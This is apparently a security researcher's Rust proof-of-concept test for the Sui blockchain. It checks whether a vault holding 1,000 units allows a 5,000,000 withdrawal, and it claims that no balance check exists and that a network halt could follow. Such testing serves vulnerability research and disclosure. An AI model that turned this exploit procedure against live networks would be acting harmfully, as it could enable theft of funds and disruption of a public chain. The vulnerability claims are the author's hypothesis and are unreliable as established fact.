// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

//! PoC: Object Withdrawal Amount Bypass — FINAL v3
//!
//! HYPOTHESIS: withdraw_funds_from_object(obj, amount) succeeds in VM
//! even when amount >> actual_balance, because NO balance check exists
//! in any layer before settlement.
//!
//! TEST:
//!   1. Deposit 1000 into vault
//!   2. Withdraw 5,000,000 from vault (5000x overdraft)
//!   3. Check TX status
//!
//! EXPECTED IF VULNERABLE: TX Status = SUCCESS
//! EXPECTED IF FIXED:      TX Status = FAIL (InsufficientFunds or similar)

use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use test_cluster::addr_balance_test_env::TestEnvBuilder;

#[tokio::test]
async fn test_object_withdrawal_amount_bypass() {
    println!("\n");
    println!("╔══════════════════════════════════════════════════════════════════╗");
    println!("║  PoC: Object Withdrawal Amount Bypass — FINAL v3              ║");
    println!("║  Deposit: 1000  |  Withdraw: 5,000,000  |  Ratio: 5000x      ║");
    println!("╚══════════════════════════════════════════════════════════════════╝\n");

    // ================================================================
    // [1] Setup test environment with feature flags enabled
    // ================================================================
    println!("[+] Starting test cluster...");
    let mut env = TestEnvBuilder::new()
        .with_num_validators(1)
        .with_proto_override_cb(Box::new(|_, mut cfg| {
            // Enable the feature being tested
            cfg.set_enable_object_funds_withdraw_for_testing(true);
            cfg.set_enable_address_balance_gas_payments_for_testing(true);
            cfg
        }))
        .build()
        .await;

    println!("    ✓ Test cluster started (1 validator)");
    println!("    ✓ enable_object_funds_withdraw = TRUE");
    println!("    ✓ enable_address_balance_gas_payments = TRUE\n");

    let sender = env.get_sender(0);

    // ================================================================
    // [2] Publish object_balance example package
    // ================================================================
    println!("[1] Publishing object_balance package...");
    let gas_pub = env.gas_objects[&sender][0];
    let tx = env
        .tx_builder_with_gas(sender, gas_pub)
        .publish_examples("object_balance")
        .await
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let package_id = effects
        .created()
        .into_iter()
        .find(|(_, owner)| owner.is_immutable())
        .unwrap()
        .0
        .0;
    println!("    ✓ Package: {}\n", package_id);

    // ================================================================
    // [3] Create vault (new_owned) — returns vault_id
    // ================================================================
    println!("[2] Creating vault...");
    let gas_vault = env.gas_objects[&sender][0];
    let tx = env
        .tx_builder_with_gas(sender, gas_vault)
        .move_call(package_id, "object_balance", "new_owned", vec![])
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let vault_id = effects.created().into_iter().next().unwrap().0 .0;
    println!("    ✓ Vault: {}\n", vault_id);

    // ================================================================
    // [4] Deposit 1000 into vault
    //    Use separate gas for tx vs fund source to avoid conflicts
    // ================================================================
    println!("[3] Depositing 1000 into vault...");
    let gas_deposit_tx = env.gas_objects[&sender][0];
    let gas_deposit_fund = env.gas_objects[&sender][1];

    let tx = env
        .tx_builder_with_gas(sender, gas_deposit_tx)
        .transfer_sui_to_address_balance(
            FundSource::coin(gas_deposit_fund),
            vec![(1000u64, vault_id)],
        )
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    assert!(effects.status().is_ok(), "Deposit failed: {:?}", effects.status());
    println!("    ✓ Deposited 1000\n");

    // ================================================================
    // [5] ATTACK: Withdraw 5,000,000 from vault with balance 1000
    //    CRITICAL: Use FRESH gas (auto-refreshes) and FRESH vault ref
    // ================================================================
    let attack_amount = 5_000_000u64;

    // Get FRESH gas after deposit tx (version changes)
    let gas_attack = env.gas_objects[&sender][0];
    // Get FRESH vault ref (version changed after deposit)
    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;

    println!("╔══════════════════════════════════════════════════════════════════╗");
    println!("║  ATTACK PHASE                                                  ║");
    println!("╚══════════════════════════════════════════════════════════════════╝");
    println!("    Vault Balance:    1,000");
    println!("    Requested Amount: {} ({}x overdraft)", attack_amount, attack_amount / 1000);
    println!("    Vault:            {} ", vault_ref.0);
    println!("    Vault Version:    {:?}\n", vault_ref.1);

    let tx = env
        .tx_builder_with_gas(sender, gas_attack)
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_ref),
            vec![(attack_amount, sender)],
        )
        .build();

    // ================================================================
    // [6] Execute and analyze result
    // ================================================================
    let result = env.exec_tx_directly(tx).await;

    println!("╔══════════════════════════════════════════════════════════════════╗");
    println!("║  RESULT                                                        ║");
    println!("╚══════════════════════════════════════════════════════════════════╝");
    println!();

    match result {
        Ok((digest, effects)) => {
            println!("    TX Digest: {}", digest);
            println!("    TX Status: {:?}\n", effects.status());

            if effects.status().is_ok() {
                // ╔════════════════════════════════════════════════════════════╗
                // ║  🔴 VULNERABILITY CONFIRMED                                ║
                // ╚════════════════════════════════════════════════════════════╝
                println!("╔══════════════════════════════════════════════════════════════════╗");
                println!("║  🔴 CRITICAL: VULNERABILITY CONFIRMED!                          ║");
                println!("╚══════════════════════════════════════════════════════════════════╝");
                println!();
                println!("    withdraw_funds_from_object() SUCCEEDED");
                println!("    with amount 5000x the actual balance!");
                println!();
                println!("    Balance:    1,000");
                println!("    Requested:  5,000,000");
                println!("    Ratio:      5000x overdraft");
                println!();
                println!("    PROOF: No balance check exists in:");
                println!("      - resolve_funds_withdrawal (Rust)");
                println!("      - withdraw_funds_from_object (Move)");
                println!("      - withdraw_from_object (Move)");
                println!("      - withdraw_from_accumulator_address (Native)");
                println!();
                println!("    Next: Settlement will process Split(5M)");
                println!("    → underflow → abort → network halt");
                println!();

                // Check for accumulator events
                let events = effects.accumulator_events();
                if !events.is_empty() {
                    println!("    [+] AccumulatorEvent::Split found in effects!");
                    println!("        Count: {}", events.len());
                    for event in events {
                        println!("        {:?}", event);
                    }
                }

                panic!(
                    "[CRITICAL] Object withdrawal bypasses balance check — \
                     TX succeeded when it should have failed!"
                );

            } else {
                // ╔════════════════════════════════════════════════════════════╗
                // ║  🟢 SAFE — Transaction failed                               ║
                // ╚════════════════════════════════════════════════════════════╝
                let status_str = format!("{:?}", effects.status());

                println!("    ✓ Transaction FAILED as expected\n");
                println!("    Status: {}\n", status_str);

                if status_str.contains("InsufficientFunds")
                    || status_str.contains("ENotEnough")
                    || status_str.contains("EObjectFundsWithdrawNotEnabled")
                    || status_str.contains("underflow")
                {
                    println!("╔══════════════════════════════════════════════════════════════════╗");
                    println!("║  🟢 DEFENSE DETECTED                                            ║");
                    println!("╚══════════════════════════════════════════════════════════════════╝");
                    println!();
                    println!("    A balance check blocked the attack.");
                    println!();
                    println!("    Possible defenses:");
                    println!("      - PR #26849 (v126): \"changes how insufficient funds\"");
                    println!("        for withdrawals are handled\"");
                    println!("      - Hidden check in execution path");
                    println!("      - Settlement-level pre-validation");
                    println!();
                    println!("    CONCLUSION: Vulnerability likely FIXED.");
                    println!("    Re-assess severity accordingly.");
                } else {
                    println!("[!] Transaction failed with unexpected error.");
                    println!("    This may indicate a different defense mechanism.");
                }
            }
        }

        Err(e) => {
            // ╔════════════════════════════════════════════════════════════╗
            // ║  🟡 Execution error — test setup issue                      ║
            // ╚════════════════════════════════════════════════════════════╝
            println!("    ✗ Execution error: {:?}\n", e);

            let err_str = format!("{:?}", e);

            if err_str.contains("ObjectVersionUnavailableForConsumption") {
                println!("    [i] ObjectVersionUnavailableForConsumption");
                println!("        → Vault/gas version conflict");
                println!("        → FIX: Check get_latest_object_ref() usage");
                println!("        → This is a TEST BUG, not a defense");
            } else if err_str.contains("EObjectFundsWithdrawNotEnabled") {
                println!("    [i] Feature flag not enabled!");
                println!("        → Check ProtocolConfig override");
            } else {
                println!("    [?] Unknown error — may be test setup issue");
            }

            println!("\n    [?] Could not determine vulnerability status.");
            println!("        Fix the test and retry.");
        }
    }
}
